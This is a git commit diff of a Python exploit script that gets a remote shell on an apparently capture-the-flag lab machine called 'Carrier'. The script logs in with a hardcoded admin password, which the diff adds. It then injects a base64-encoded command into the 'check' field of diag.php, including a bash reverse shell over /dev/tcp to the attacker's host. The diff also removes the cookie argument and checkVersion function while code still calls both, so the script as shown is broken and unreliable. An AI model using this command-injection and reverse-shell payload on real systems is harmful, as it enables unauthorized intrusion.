94275309422dd4b1d51ca384dc11698d548370e6
pyMurphy <32463165+pyMurphy@users.noreply.github.com>
2019-02-11 23:54:42 +0000

    Update carrier_reverse_tcp.py

--- carrier_reverse_tcp.py
+++ carrier_reverse_tcp.py
@@ -1,17 +1,11 @@
 import requests, base64, argparse, sys
 
 parser = argparse.ArgumentParser(description='Program to get an RCE shell interface on the Carrier box. Made by 0xMurphy')
-parser.add_argument('-c','--cookie', help='PHPSESSID')
 parser.add_argument('rhost', help='Remote host IP')
 args = parser.parse_args()
 
 USERNAME='admin'
-PASSWORD='' # Remove because box still active
-
-def checkVersion():
-	if sys.version_info[0] < 3:
-		print('Please use Python 3.x...')
-		sys.exit()
+PASSWORD='NET_45JDX23'
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
@@ -24,13 +18,6 @@ def authenticate():
 		print('Login failed. Retrying...')
 		authenticate()
 
-def consolify(html):
-	html = html[1396:]
-	html = html[:html.find('</div>')]
-	html = html.replace('<p>','')
-	html = html.replace('</p>','\n')
-	return html
-
 def exploit():
 	if not args.cookie:
 		args.cookie='authBy0xMurphy'
@@ -41,8 +28,6 @@ def exploit():
 		print('Authentication failed. Reauthenticating...')
 		authenticate()
 		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
-	else:
-		print(consolify(r.text))
 
 if __name__ == '__main__':
 	checkVersion()
